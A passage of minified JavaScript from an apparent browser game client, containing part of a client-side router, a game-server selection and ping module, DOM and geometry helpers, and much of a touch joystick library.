                            .then(c, n === f ? null : o)
                        : c("div");
                        return;
                    }
                if (n === f) throw Error("Could not resolve default route " + f + ".");
                B(f, null, {
                    replace: !0,
                });
            }
            s(i.params, h.history.state), r(0);
        }

        function A() {
            b || ((b = !0), k(O));
        }

        function B(t, n, i) {
            if (((t = o(t, n)), w)) {
                A();
                var a = i ? i.state : null,
                    r = i ? i.title : null;
                i && i.replace
                    ? h.history.replaceState(a, r, D.prefix + t)
                : h.history.pushState(a, r, D.prefix + t);
            } else h.location.href = D.prefix + t;
        }

        function D(t, n, i) {
            if (!t) throw TypeError("DOM element being rendered to does not exist.");
            if (
                ((p = Object.keys(i).map(function (t) {
                    if ("/" !== t[0]) throw SyntaxError("Routes must start with a '/'.");
                    if (/:([^\/\.-]+)(\.{3})?:/.test(t))
                        throw SyntaxError(
                            "Route parameter names must be separated with either '/', '.', or '-'."
                        );
                    return {
                        route: t,
                        component: i[t],
                        check: r(t),
                    };
                })),
                 (f = n),
                 null != n)
            ) {
                var o = a(n);
                if (
                    !p.some(function (t) {
                        return t.check(o);
                    })
                )
                    throw ReferenceError("Default route doesn't match any known routes.");
            }
            "function" == typeof h.history.pushState
                ? h.addEventListener("popstate", A, !1)
            : "#" === D.prefix[0] && h.addEventListener("hashchange", O, !1),
                (w = !0),
                u.mount(t, I),
                O();
        }
        return (
            (D.set = function (t, n, i) {
                null != _ && ((i = i || {}).replace = !0), (_ = null), B(t, n, i);
            }),
            (D.get = function () {
                return m;
            }),
            (D.prefix = "#!"),
            (D.Link = {
                view: function (t) {
                    var i,
                        a,
                        r,
                        s = n(
                            t.attrs.selector || "a",
                            l(t.attrs, ["options", "params", "selector", "onclick"]),
                            t.children
                        );
                    return (
                        (s.attrs.disabled = Boolean(s.attrs.disabled))
                        ? ((s.attrs.href = null), (s.attrs["aria-disabled"] = "true"))
                        : ((i = t.attrs.options),
                           (a = t.attrs.onclick),
                           (r = o(s.attrs.href, t.attrs.params)),
                           (s.attrs.href = D.prefix + r),
                           (s.attrs.onclick = function (t) {
                            var n;
                            "function" == typeof a
                                ? (n = a.call(t.currentTarget, t))
                            : null == a ||
                                "object" != typeof a ||
                                ("function" == typeof a.handleEvent && a.handleEvent(t)),
                                !1 === n ||
                                t.defaultPrevented ||
                                (0 !== t.button && 0 !== t.which && 1 !== t.which) ||
                                (t.currentTarget.target &&
                                 "_self" !== t.currentTarget.target) ||
                                t.ctrlKey ||
                                t.metaKey ||
                                t.shiftKey ||
                                t.altKey ||
                                (t.preventDefault(), (t.redraw = !1), D.set(r, null, i));
                        })),
                        s
                    );
                },
            }),
            (D.param = function (t) {
                return g && null != t ? g[t] : g;
            }),
            D
        );
    });
}

function fh() {
    return Zs
        ? dn
    : ((Zs = 1), (dn = hh()("u" > typeof window ? window : null, ss)));
}
var Ai = eh,
    ro = lh,
    oo = ss,
    pe = function () {
        return Ai.apply(this, arguments);
    };
(pe.m = Ai),
    (pe.trust = Ai.trust),
    (pe.fragment = Ai.fragment),
    (pe.Fragment = "["),
    (pe.mount = oo.mount),
    (pe.route = fh()),
    (pe.render = eo()),
    (pe.redraw = oo.redraw),
    (pe.request = ro.request),
    (pe.jsonp = ro.jsonp),
    (pe.parseQueryString = no()),
    (pe.buildQueryString = to()),
    (pe.parsePathname = os()),
    (pe.buildPathname = rs()),
    (pe.vnode = Ge()),
    (pe.PromisePolyfill = jr()),
    (pe.censor = so());
var Ne = pe;

function we(t, n, i, o, a) {
    (this.debugLog = !1),
        (this.baseUrl = t),
        (this.lobbySize = i),
        (this.devPort = n),
        (this.lobbySpread = o),
        (this.rawIPs = !!a),
        (this.server = void 0),
        (this.gameIndex = void 0),
        (this.callback = void 0),
        (this.errorCallback = void 0);
}
(we.prototype.regionInfo = {
    0: {
        name: "Local",
        latitude: 0,
        longitude: 0,
    },
    "us-east": {
        name: "Miami",
        latitude: 40.1393329,
        longitude: -75.8521818,
    },
    "us-west": {
        name: "Silicon Valley",
        latitude: 47.6149942,
        longitude: -122.4759879,
    },
    gb: {
        name: "London",
        latitude: 51.5283063,
        longitude: -0.382486,
    },
    "eu-west": {
        name: "Frankfurt",
        latitude: 50.1211273,
        longitude: 8.496137,
    },
    au: {
        name: "Sydney",
        latitude: -33.8479715,
        longitude: 150.651084,
    },
    sg: {
        name: "Singapore",
        latitude: 1.3147268,
        longitude: 103.7065876,
    },
}),
    (we.prototype.start = function (t, n, i, o) {
    if (((this.callback = n), (this.errorCallback = i), o)) return n();
    let a = this.parseServerQuery(t);
    a && a.length > 0
        ? (this.log("Found server in query."),
           (this.password = a[3]),
           this.connect(a[0], a[1], a[2]))
    : this.errorCallback("Unable to find server");
}),
    (we.prototype.parseServerQuery = function (t) {
    let n = new URLSearchParams(location.search, !0),
        i = t || n.get("server");
    if ("string" != typeof i) return [];
    let [o, a] = i.split(":");
    return [o, a, n.get("password")];
}),
    (we.prototype.findServer = function (t, n) {
    var i = this.servers[t];
    for (let o = 0; o < i.length; o++) {
        let a = i[o];
        if (a.name === n) return a;
    }
    console.warn(
        "Could not find server in region " + t + " with serverName " + n + "."
    );
}),
    (we.prototype.seekServer = function (t, n, i) {
    null == i && (i = "random"), null == n && (n = !1);
    let o = ["random"],
        a = this.lobbySize,
        r = this.lobbySpread,
        s = this.servers[t]
    .flatMap(function (t) {
        let n = 0;
        return t.games.map(function (i) {
            let o = n++;
            return {
                region: t.region,
                index: t.index * t.games.length + o,
                gameIndex: o,
                gameCount: t.games.length,
                playerCount: i.playerCount,
                playerCapacity: i.playerCapacity,
                isPrivate: i.isPrivate,
            };
        });
    })
    .filter(function (t) {
        return !t.isPrivate;
    })
    .filter(function (t) {
        return !n || (0 == t.playerCount && t.gameIndex >= t.gameCount / 2);
    })
    .filter(function (t) {
        return "random" == i || o[t.index % o.length].key == i;
    })
    .sort(function (t, n) {
        return n.playerCount - t.playerCount;
    })
    .filter(function (t) {
        return t.playerCount < a;
    });
    if ((n && s.reverse(), 0 == s.length)) {
        this.errorCallback("No open servers.");
        return;
    }
    let l = Math.min(r, s.length);
    var c = Math.floor(Math.random() * l);
    c = Math.min(c, s.length - 1);
    let d = s[c],
        h = d.region;
    var c = Math.floor(d.index / d.gameCount);
    let u = d.index % d.gameCount;
    return this.log("Found server."), [h, c, u];
}),
    (we.prototype.connect = function (t, n, i) {
    if (this.connected) return;
    let o = this.findServer(t, n);
    if (null == o) {
        this.errorCallback(
            "Failed to find server for region " + t + " and serverName " + n
        );
        return;
    }
    window.history.replaceState(
        document.title,
        document.title,
        this.generateHref(t, n, this.password)
    ),
        (this.server = o),
        (this.gameIndex = i),
        this.log(
        "Calling callback with address",
        this.serverAddress(o),
        "on port",
        this.serverPort(o)
    ),
        this.callback(this.serverAddress(o), this.serverPort(o), i),
        Lt && clearInterval(Lt);
}),
    (we.prototype.switchServer = function (t, n) {
    (this.switchingServers = !0),
        (window.location = this.generateHref(t, n, null));
}),
    (we.prototype.generateHref = function (t, n, i) {
    let o = window.location.href.split("?")[0];
    return (
        (o += "?server=" + t + ":" + n),
        i && (o += "&password=" + encodeURIComponent(i)),
        o
    );
}),
    (we.prototype.serverAddress = function (t) {
    return 0 == t.region
        ? "localhost"
    : t.key + "." + t.region + "." + this.baseUrl;
}),
    (we.prototype.serverPort = function (t) {
    return t.port;
});
let Lt;

function uh(t) {
    let n = Math.min(...t.map((t) => t.ping || 1 / 0)),
        i = t.filter((t) => t.ping === n);
    return !i.length > 0
        ? null
    : i.reduce((t, n) => (t.playerCount > n.playerCount ? t : n));
}
(we.prototype.processServers = function (t) {
    return (
        Lt && clearInterval(Lt),
        new Promise((n) => {
            let i = {},
                o = (t) => {
                    let n = i[t],
                        o = n[0],
                        a = this.serverAddress(o),
                        r = this.serverPort(o);
                    r && (a += `:${r}`);
                    let s = `https://${a}/ping`,
                        l = new Date().getTime();
                    return Promise.race([
                        fetch(s)
                        .then(() => {
                            let t = new Date().getTime() - l;
                            n.forEach((n) => {
                                (n.pings = n.pings ?? []),
                                    n.pings.push(t),
                                    n.pings.length > 10 && n.pings.shift(),
                                    (n.ping = Math.floor(
                                    n.pings.reduce((t, n) => t + n, 0) / n.pings.length
                                ));
                            });
                        })
                        .catch(() => {}),
                        new Promise((t) => setTimeout(() => t(), 800)),
                    ]);
                },
                a = async () => {
                    await Promise.all(Object.keys(i).map(o)),
                        window.blockRedraw || Ne.redraw();
                };
            for (let r in (t.forEach((t) => {
                (i[t.region] = i[t.region] || []), i[t.region].push(t);
            }),
                           i))
                i[r] = i[r].sort(function (t, n) {
                    return n.playerCount - t.playerCount;
                });
            this.servers = i;
            let s,
                [l, c] = this.parseServerQuery();
            t.forEach((t) => {
                l === t.region && c === t.name && ((t.selected = !0), (s = t));
            }),
                a()
                .then(a)
                .then(() => {
                if (s) return;
                let n = uh(t);
                n || (n = t[0]),
                    n &&
                    ((n.selected = !0),
                     window.history.replaceState(
                    document.title,
                    document.title,
                    this.generateHref(n.region, n.name, this.password)
                )),
                    window.blockRedraw || Ne.redraw();
            })
                .then(a)
                .catch((t) => {})
                .finally(n),
                (Lt = setInterval(a, 1e3));
        })
    );
}),
    (we.prototype.ipToHex = function (t) {
    return t
        .split(".")
        .map((t) => ("00" + parseInt(t).toString(16)).substr(-2))
        .join("")
        .toLowerCase();
}),
    (we.prototype.hashIP = function (t) {
    return On(this.ipToHex(t));
}),
    (we.prototype.log = function () {
    return this.debugLog
        ? console.log.apply(void 0, arguments)
    : console.verbose
        ? console.verbose.apply(void 0, arguments)
    : void 0;
}),
    (we.prototype.stripRegion = function (t) {
    return (
        t.startsWith("vultr:")
        ? (t = t.slice(6))
        : t.startsWith("do:") && (t = t.slice(3)),
        t
    );
});
const dh = function (t, n) {
    return t.concat(n);
},
      ph = function (t, n) {
          return n.map(t).reduce(dh, []);
      };
Array.prototype.flatMap = function (t) {
    return ph(t, this);
};
const fi = (t, n) => {
    let i = n.x - t.x,
        o = n.y - t.y;
    return Math.sqrt(i * i + o * o);
},
      mh = (t, n) => {
          let i = n.x - t.x,
              o = n.y - t.y;
          return yh(Math.atan2(o, i));
      },
      gh = (t, n, i) => {
          let o = {
              x: 0,
              y: 0,
          };
          return (
              (i = Bn(i)),
              (o.x = t.x - n * Math.cos(i)),
              (o.y = t.y - n * Math.sin(i)),
              o
          );
      },
      Bn = (t) => t * (Math.PI / 180),
      yh = (t) => t * (180 / Math.PI),
      wh = (t) => (isNaN(t.buttons) ? 0 !== t.pressure : 0 !== t.buttons),
      pn = new Map(),
      js = (t) => {
          pn.has(t) && clearTimeout(pn.get(t)), pn.set(t, setTimeout(t, 100));
      },
      wi = (t, n, i) => {
          let o = n.split(/[ ,]+/g),
              a;
          for (let r = 0; r < o.length; r += 1)
              (a = o[r]),
                  t.addEventListener
                  ? t.addEventListener(a, i, !1)
              : t.attachEvent && t.attachEvent(a, i);
      },
      er = (t, n, i) => {
          let o = n.split(/[ ,]+/g),
              a;
          for (let r = 0; r < o.length; r += 1)
              (a = o[r]),
                  t.removeEventListener
                  ? t.removeEventListener(a, i)
              : t.detachEvent && t.detachEvent(a, i);
      },
      ao = (t) => (
          t.preventDefault(), t.type.match(/^touch/) ? t.changedTouches : t
      ),
      tr = () => {
          let t =
              void 0 !== window.pageXOffset
          ? window.pageXOffset
          : (
              document.documentElement ||
              document.body.parentNode ||
              document.body
          ).scrollLeft,
              n =
              void 0 !== window.pageYOffset
          ? window.pageYOffset
          : (
              document.documentElement ||
              document.body.parentNode ||
              document.body
          ).scrollTop;
          return {
              x: t,
              y: n,
          };
      },
      ir = (t, n) => {
          n.top || n.right || n.bottom || n.left
              ? ((t.style.top = n.top),
                 (t.style.right = n.right),
                 (t.style.bottom = n.bottom),
                 (t.style.left = n.left))
          : ((t.style.left = n.x + "px"), (t.style.top = n.y + "px"));
      },
      as = (t, n, i) => {
          let o = lo(t);
          for (let a in o)
              if (o.hasOwnProperty(a)) {
                  if ("string" == typeof n) o[a] = n + " " + i;
                  else {
                      let r = "";
                      for (let s = 0, l = n.length; s < l; s += 1)
                          r += n[s] + " " + i + ", ";
                      o[a] = r.slice(0, -2);
                  }
              }
          return o;
      },
      kh = (t, n) => {
          let i = lo(t);
          for (let o in i) i.hasOwnProperty(o) && (i[o] = n);
          return i;
      },
      lo = (t) => {
          let n = {};
          return (
              (n[t] = ""),
              ["webkit", "Moz", "o"].forEach(function (i) {
                  n[i + t.charAt(0).toUpperCase() + t.slice(1)] = "";
              }),
              n
          );
      },
      mn = (t, n) => {
          for (let i in n) n.hasOwnProperty(i) && (t[i] = n[i]);
          return t;
      },
      vh = (t, n) => {
          let i = {};
          for (let o in t)
              t.hasOwnProperty(o) && n.hasOwnProperty(o)
                  ? (i[o] = n[o])
              : t.hasOwnProperty(o) && (i[o] = t[o]);
          return i;
      },
      zn = (t, n) => {
          if (t.length) for (let i = 0, o = t.length; i < o; i += 1) n(t[i]);
          else n(t);
      },
      xh = (t, n, i) => ({
          x: Math.min(Math.max(t.x, n.x - i), n.x + i),
          y: Math.min(Math.max(t.y, n.y - i), n.y + i),
      });
var cn,
    $s,
    hn,
    Ks,
    fn,
    Js,
    un,
    Qs,
    dn,
    Zs,
    vt,
    bh = "ontouchstart" in window,
    Sh = !!window.PointerEvent,
    Th = !!window.MSPointerEvent,
    Bt = {
        touch: {
            start: "touchstart",
            move: "touchmove",
            end: "touchend, touchcancel",
        },
        mouse: {
            start: "mousedown",
            move: "mousemove",
            end: "mouseup",
        },
        pointer: {
            start: "pointerdown",
            move: "pointermove",
            end: "pointerup, pointercancel",
        },
        MSPointer: {
            start: "MSPointerDown",
            move: "MSPointerMove",
            end: "MSPointerUp",
        },
    },
    Kt = {};

function Ve() {}

function he(t, n) {
    return (
        (this.identifier = n.identifier),
        (this.position = n.position),
        (this.frontPosition = n.frontPosition),
        (this.collection = t),
        (this.defaults = {
            size: 100,
            threshold: 0.1,
            color: "white",
            fadeTime: 250,
            dataOnly: !1,
            restJoystick: !0,
            restOpacity: 0.5,
            mode: "dynamic",
            zone: document.body,
            lockX: !1,
            lockY: !1,
            shape: "circle",
        }),
        this.config(n),
        "dynamic" === this.options.mode && (this.options.restOpacity = 0),
        (this.id = he.id),
        (he.id += 1),
        this.buildEl().stylize(),
        (this.instance = {
            el: this.ui.el,
            on: this.on.bind(this),
            off: this.off.bind(this),
            show: this.show.bind(this),
            hide: this.hide.bind(this),
            add: this.addToDom.bind(this),
            remove: this.removeFromDom.bind(this),
            destroy: this.destroy.bind(this),
            setPosition: this.setPosition.bind(this),
            resetDirection: this.resetDirection.bind(this),
            computeDirection: this.computeDirection.bind(this),
            trigger: this.trigger.bind(this),
            position: this.position,
            frontPosition: this.frontPosition,
            ui: this.ui,
            identifier: this.identifier,
            id: this.id,
            options: this.options,
        }),
        this.instance
    );
}

function ae(t, n) {
    var i = this;
    (i.nipples = []),
        (i.idles = []),
        (i.actives = []),
        (i.ids = []),
        (i.pressureIntervals = {}),
        (i.manager = t),
        (i.id = ae.id),
        (ae.id += 1),
        (i.defaults = {
        zone: document.body,
        multitouch: !1,
        maxNumberOfNipples: 10,
        mode: "dynamic",
        position: {
            top: 0,
            left: 0,
        },
        catchDistance: 200,
        size: 100,
        threshold: 0.1,
        color: "white",
        fadeTime: 250,
        dataOnly: !1,
        restJoystick: !0,
        restOpacity: 0.5,
        lockX: !1,
        lockY: !1,
        shape: "circle",
        dynamicPage: !1,
        follow: !1,
    }),
        i.config(n),
        ("static" === i.options.mode || "semi" === i.options.mode) &&
        (i.options.multitouch = !1),
        i.options.multitouch || (i.options.maxNumberOfNipples = 1);
    let o = getComputedStyle(i.options.zone.parentElement);
    return (
        o && "flex" === o.display && (i.parentIsFlex = !0),
        i.updateBox(),
        i.prepareNipples(),
        i.bindings(),
        i.begin(),
        i.nipples
    );
}

function de(t) {
    var n = this;
    (n.ids = {}),
        (n.index = 0),
        (n.collections = []),
        (n.scroll = tr()),
        n.config(t),
        n.prepareCollections();
    var i = function () {
        var t;
        n.collections.forEach(function (i) {
            i.forEach(function (i) {
                (t = i.el.getBoundingClientRect()),
                    (i.position = {
                    x: n.scroll.x + t.left,
                    y: n.scroll.y + t.top,
                });
            });
        });
    };
    wi(window, "resize", function () {
        js(i);
    });
    var o = function () {
        n.scroll = tr();
    };
    return (
        wi(window, "scroll", function () {
            js(o);
        }),
        n.collections
    );
}
Sh
    ? (vt = Bt.pointer)
: Th
    ? (vt = Bt.MSPointer)
: bh
    ? ((vt = Bt.touch), (Kt = Bt.mouse))
: (vt = Bt.mouse),
    (Ve.prototype.on = function (t, n) {
    var i,
        o = this,
        a = t.split(/[ ,]+/g);
    o._handlers_ = o._handlers_ || {};
    for (var r = 0; r < a.length; r += 1)
        (i = a[r]),
            (o._handlers_[i] = o._handlers_[i] || []),
            o._handlers_[i].push(n);
    return o;
}),
    (Ve.prototype.off = function (t, n) {
    var i = this;
    return (
        (i._handlers_ = i._handlers_ || {}),
        void 0 === t
        ? (i._handlers_ = {})
        : void 0 === n
        ? (i._handlers_[t] = null)
        : i._handlers_[t] &&
        i._handlers_[t].indexOf(n) >= 0 &&
        i._handlers_[t].splice(i._handlers_[t].indexOf(n), 1),
        i
    );
}),
    (Ve.prototype.trigger = function (t, n) {
    var i,
        o = this,
        a = t.split(/[ ,]+/g);
    o._handlers_ = o._handlers_ || {};
    for (var r = 0; r < a.length; r += 1)
        (i = a[r]),
            o._handlers_[i] &&
            o._handlers_[i].length &&
            o._handlers_[i].forEach(function (t) {
            t.call(
                o,
                {
                    type: i,
                    target: o,
                },
                n
            );
        });
}),
    (Ve.prototype.config = function (t) {
    var n = this;
    (n.options = n.defaults || {}), t && (n.options = vh(n.options, t));
}),
    (Ve.prototype.bindEvt = function (t, n) {
    var i = this;
    return (
        (i._domHandlers_ = i._domHandlers_ || {}),
        (i._domHandlers_[n] = function () {
            "function" == typeof i["on" + n]
                ? i["on" + n].apply(i, arguments)
            : console.warn('[WARNING] : Missing "on' + n + '" handler.');
        }),
        wi(t, vt[n], i._domHandlers_[n]),
        Kt[n] && wi(t, Kt[n], i._domHandlers_[n]),
        i
    );
}),
    (Ve.prototype.unbindEvt = function (t, n) {
    var i = this;
    return (
        (i._domHandlers_ = i._domHandlers_ || {}),
        er(t, vt[n], i._domHandlers_[n]),
        Kt[n] && er(t, Kt[n], i._domHandlers_[n]),
        delete i._domHandlers_[n],
        this
    );
}),
    (he.prototype = new Ve()),
    (he.constructor = he),
    (he.id = 0),
    (he.prototype.buildEl = function (t) {
    return (
        (this.ui = {}),
        this.options.dataOnly ||
        ((this.ui.el = document.createElement("div")),
         (this.ui.back = document.createElement("div")),
         (this.ui.front = document.createElement("div")),
         (this.ui.el.className = "nipple collection_" + this.collection.id),
         (this.ui.back.className = "back"),
         (this.ui.front.className = "front"),
         this.ui.el.setAttribute(
            "id",
            "nipple_" + this.collection.id + "_" + this.id
        ),
         this.ui.el.appendChild(this.ui.back),
         this.ui.el.appendChild(this.ui.front)),
        this
    );
}),
    (he.prototype.stylize = function () {
    if (this.options.dataOnly) return this;
    var t = this.options.fadeTime + "ms",
        n = kh("borderRadius", "50%"),
        i = as("transition", "opacity", t),
        o = {};
    return (
        (o.el = {
            position: "absolute",
            opacity: this.options.restOpacity,
            display: "block",
            zIndex: 999,
        }),
        (o.back = {
            position: "absolute",
            display: "block",
            width: this.options.size + "px",
            height: this.options.size + "px",
            marginLeft: -this.options.size / 2 + "px",
            marginTop: -this.options.size / 2 + "px",
            background: this.options.color,
            opacity: ".5",
        }),
        (o.front = {
            width: this.options.size / 2 + "px",
            height: this.options.size / 2 + "px",
            position: "absolute",
            display: "block",
            marginLeft: -this.options.size / 4 + "px",
            marginTop: -this.options.size / 4 + "px",
            background: this.options.color,
            opacity: ".5",
            transform: "translate(0px, 0px)",
        }),
        mn(o.el, i),
        "circle" === this.options.shape && mn(o.back, n),
        mn(o.front, n),
        this.applyStyles(o),
        this
    );
}),
    (he.prototype.applyStyles = function (t) {
    for (var n in this.ui)
        if (this.ui.hasOwnProperty(n))
            for (var i in t[n]) this.ui[n].style[i] = t[n][i];
    return this;
}),
    (he.prototype.addToDom = function () {
    return (
        this.options.dataOnly ||
        document.body.contains(this.ui.el) ||
        this.options.zone.appendChild(this.ui.el),
        this
    );
}),
    (he.prototype.removeFromDom = function () {
    return (
        this.options.dataOnly ||
        !document.body.contains(this.ui.el) ||
        this.options.zone.removeChild(this.ui.el),
        this
    );
}),
    (he.prototype.destroy = function () {
    clearTimeout(this.removeTimeout),
        clearTimeout(this.showTimeout),
        clearTimeout(this.restTimeout),
        this.trigger("destroyed", this.instance),
        this.removeFromDom(),
        this.off();
}),
    (he.prototype.show = function (t) {
    var n = this;
    return (
        n.options.dataOnly ||
        (clearTimeout(n.removeTimeout),
         clearTimeout(n.showTimeout),
         clearTimeout(n.restTimeout),
         n.addToDom(),
         n.restCallback(),
         setTimeout(function () {
            n.ui.el.style.opacity = 1;
        }, 0),
         (n.showTimeout = setTimeout(function () {
            n.trigger("shown", n.instance),
                "function" == typeof t && t.call(this);
        }, n.options.fadeTime))),
        n
    );
}),
    (he.prototype.hide = function (t) {
    var n = this;
    if (n.options.dataOnly) return n;
    if (
        ((n.ui.el.style.opacity = n.options.restOpacity),
         clearTimeout(n.removeTimeout),
         clearTimeout(n.showTimeout),
         clearTimeout(n.restTimeout),
         (n.removeTimeout = setTimeout(function () {
            var i = "dynamic" === n.options.mode ? "none" : "block";
            (n.ui.el.style.display = i),
                "function" == typeof t && t.call(n),
                n.trigger("hidden", n.instance);
        }, n.options.fadeTime)),
         n.options.restJoystick)
    ) {
        let i = n.options.restJoystick,
            o = {};
        (o.x = !0 === i || !1 !== i.x ? 0 : n.instance.frontPosition.x),
            (o.y = !0 === i || !1 !== i.y ? 0 : n.instance.frontPosition.y),
            n.setPosition(t, o);
    }
    return n;
}),
    (he.prototype.setPosition = function (t, n) {
    var i = this;
    i.frontPosition = {
        x: n.x,
        y: n.y,
    };
    var o = i.options.fadeTime + "ms",
        a = {};
    a.front = as("transition", ["transform"], o);
    var r = {
        front: {},
    };
    (r.front = {
        transform:
        "translate(" + i.frontPosition.x + "px," + i.frontPosition.y + "px)",
    }),
        i.applyStyles(a),
        i.applyStyles(r),
        (i.restTimeout = setTimeout(function () {
        "function" == typeof t && t.call(i), i.restCallback();
    }, i.options.fadeTime));
}),
    (he.prototype.restCallback = function () {
    var t = {};
    (t.front = as("transition", "none", "")),
        this.applyStyles(t),
        this.trigger("rested", this.instance);
}),
    (he.prototype.resetDirection = function () {
    this.direction = {
        x: !1,
        y: !1,
        angle: !1,
    };
}),
    (he.prototype.computeDirection = function (t) {
    var n,
        i,
        o,
        a = t.angle.radian,
        r = Math.PI / 4,
        s = Math.PI / 2;
    if (
        (a > r && a < 3 * r && !t.lockX
         ? (n = "up")
         : a > -r && a <= r && !t.lockY
         ? (n = "left")
         : a > -(3 * r) && a <= -r && !t.lockX
         ? (n = "down")
         : t.lockY || (n = "right"),
         t.lockY || (i = a > -s && a < s ? "left" : "right"),
         t.lockX || (o = a > 0 ? "up" : "down"),
         t.force > this.options.threshold)
    ) {
        var l,
            c = {};
        for (l in this.direction)
            this.direction.hasOwnProperty(l) && (c[l] = this.direction[l]);
        var d = {};
        for (l in ((this.direction = {
            x: i,
            y: o,
            angle: n,
        }),
                   (t.direction = this.direction),
                   c))
            c[l] === this.direction[l] && (d[l] = !0);
        if (d.x && d.y && d.angle) return t;
        (d.x && d.y) || this.trigger("plain", t),
            d.x || this.trigger("plain:" + i, t),
            d.y || this.trigger("plain:" + o, t),
            d.angle || this.trigger("dir dir:" + n, t);
    } else this.resetDirection();
    return t;
}),
    (ae.prototype = new Ve()),
    (ae.constructor = ae),
    (ae.id = 0),
    (ae.prototype.prepareNipples = function () {
    var t = this.nipples;
    (t.on = this.on.bind(this)),
        (t.off = this.off.bind(this)),
        (t.options = this.options),
        (t.destroy = this.destroy.bind(this)),
        (t.ids = this.ids),
        (t.id = this.id),
        (t.processOnMove = this.processOnMove.bind(this)),
        (t.processOnEnd = this.processOnEnd.bind(this)),
        (t.get = function (n) {
        if (void 0 === n) return t[0];
        for (var i = 0, o = t.length; i < o; i += 1)
            if (t[i].identifier === n) return t[i];
        return !1;
    });
}),
    (ae.prototype.bindings = function () {
    var t = this;
    t.bindEvt(t.options.zone, "start"),
        (t.options.zone.style.touchAction = "none"),
        (t.options.zone.style.msTouchAction = "none");
}),
    (ae.prototype.begin = function () {
    var t = this.options;
    if ("static" === t.mode) {
        var n = this.createNipple(t.position, this.manager.getIdentifier());
        n.add(), this.idles.push(n);
    }
}),
    (ae.prototype.createNipple = function (t, n) {
    var i = this.manager.scroll,
        o = {},
        a = this.options,
        r = {
            x: this.parentIsFlex ? i.x : i.x + this.box.left,
            y: this.parentIsFlex ? i.y : i.y + this.box.top,
        };
    if (t.x && t.y)
        o = {
            x: t.x - r.x,
            y: t.y - r.y,
        };
    else if (t.top || t.right || t.bottom || t.left) {
        var s = document.createElement("DIV");
        (s.style.display = "hidden"),
            (s.style.top = t.top),
            (s.style.right = t.right),
            (s.style.bottom = t.bottom),
            (s.style.left = t.left),
            (s.style.position = "absolute"),
            a.zone.appendChild(s);
        var l = s.getBoundingClientRect();
        a.zone.removeChild(s),
            (o = t),
            (t = {
            x: l.left + i.x,
            y: l.top + i.y,
        });
    }
    var c = new he(this, {
        color: a.color,
        size: a.size,
        threshold: a.threshold,
        fadeTime: a.fadeTime,
        dataOnly: a.dataOnly,
        restJoystick: a.restJoystick,
        restOpacity: a.restOpacity,
        mode: a.mode,
        identifier: n,
        position: t,
        zone: a.zone,
        frontPosition: {
            x: 0,
            y: 0,
        },
        shape: a.shape,
    });
    return (
        a.dataOnly || (ir(c.ui.el, o), ir(c.ui.front, c.frontPosition)),
        this.nipples.push(c),
        this.trigger("added " + c.identifier + ":added", c),
        this.manager.trigger("added " + c.identifier + ":added", c),
        this.bindNipple(c),
        c
    );
}),
    (ae.prototype.updateBox = function () {
    var t = this;
    t.box = t.options.zone.getBoundingClientRect();
}),
    (ae.prototype.bindNipple = function (t) {
    var n,
        i = this,
        o = function (t, o) {
            (n = t.type + " " + o.id + ":" + t.type), i.trigger(n, o);
        };
    t.on("destroyed", i.onDestroyed.bind(i)),
        t.on("shown hidden rested dir plain", o),
        t.on("dir:up dir:right dir:down dir:left", o),
        t.on("plain:up plain:right plain:down plain:left", o);
}),
    (ae.prototype.pressureFn = function (t, n, i) {
    var o = this,
        a = 0;
    clearInterval(o.pressureIntervals[i]),
        (o.pressureIntervals[i] = setInterval(
        function () {
            var i = t.force || t.pressure || t.webkitForce || 0;
            i !== a &&
                (n.trigger("pressure", i),
                 o.trigger("pressure " + n.identifier + ":pressure", i),
                 (a = i));
        }.bind(o),
        100
    ));
}),
    (ae.prototype.onstart = function (t) {
    var n = this,
        i = n.options,
        o = t;
    (t = ao(t)), n.updateBox();
    var a = function (a) {
        n.actives.length < i.maxNumberOfNipples
            ? n.processOnStart(a)
        : o.type.match(/^touch/) &&
            (Object.keys(n.manager.ids).forEach(function (i) {
            if (
                0 >
                Object.values(o.touches).findIndex(function (t) {
                    return t.identifier === i;
                })
            ) {
                var a = [t[0]];
                (a.identifier = i), n.processOnEnd(a);
            }
        }),
             n.actives.length < i.maxNumberOfNipples && n.processOnStart(a));
    };
    return zn(t, a), n.manager.bindDocument(), !1;
}),
    (ae.prototype.processOnStart = function (t) {
    var n,
        i = this,
        o = i.options,
        a = i.manager.getIdentifier(t),
        r = t.force || t.pressure || t.webkitForce || 0,
        s = {
            x: t.pageX,
            y: t.pageY,
        },
        l = i.getOrCreate(a, s);
    l.identifier !== a && i.manager.removeIdentifier(l.identifier),
        (l.identifier = a);
    var c = function (n) {
        n.trigger("start", n),
            i.trigger("start " + n.id + ":start", n),
            n.show(),
            r > 0 && i.pressureFn(t, n, n.identifier),
            i.processOnMove(t);
    };
    if (
        ((n = i.idles.indexOf(l)) >= 0 && i.idles.splice(n, 1),
         i.actives.push(l),
         i.ids.push(l.identifier),
         "semi" !== o.mode)
    )
        c(l);
    else if (fi(s, l.position) <= o.catchDistance) c(l);
    else {
        l.destroy(), i.processOnStart(t);
        return;
    }
    return l;
}),
    (ae.prototype.getOrCreate = function (t, n) {
    var i,
        o = this.options;
    return /(semi|static)/.test(o.mode)
        ? (i = this.idles[0])
        ? (this.idles.splice(0, 1), i)
    : "semi" === o.mode
        ? this.createNipple(n, t)
    : (console.warn("Coudln't find the needed nipple."), !1)
    : (i = this.createNipple(n, t));
}),
    (ae.prototype.processOnMove = function (t) {
    var n = this.options,
        i = this.manager.getIdentifier(t),
        o = this.nipples.get(i),
        a = this.manager.scroll;
    if (!wh(t)) {
        this.processOnEnd(t);
        return;
    }
    if (!o) {
        console.error("Found zombie joystick with ID " + i),
            this.manager.removeIdentifier(i);
        return;
    }
    if (n.dynamicPage) {
        var r = o.el.getBoundingClientRect();
        o.position = {
            x: a.x + r.left,
            y: a.y + r.top,
        };
    }
    o.identifier = i;
    var s = o.options.size / 2,
        l = {
            x: t.pageX,
            y: t.pageY,
        };
    n.lockX && (l.y = o.position.y), n.lockY && (l.x = o.position.x);
    var c,
        d,
        h = fi(l, o.position),
        u = mh(l, o.position),
        p = Bn(u),
        f = h / s,
        $ = {
            distance: h,
            position: l,
        };
    if (
        ("circle" === o.options.shape
         ? ((c = Math.min(h, s)), (d = gh(o.position, c, u)))
         : ((d = xh(l, o.position, s)), (c = fi(d, o.position))),
         n.follow)
    ) {
        if (h > s) {
            let g = l.x - d.x,
                m = l.y - d.y;
            (o.position.x += g),
                (o.position.y += m),
                (o.el.style.top = o.position.y - (this.box.top + a.y) + "px"),
                (o.el.style.left = o.position.x - (this.box.left + a.x) + "px"),
                (h = fi(l, o.position));
        }
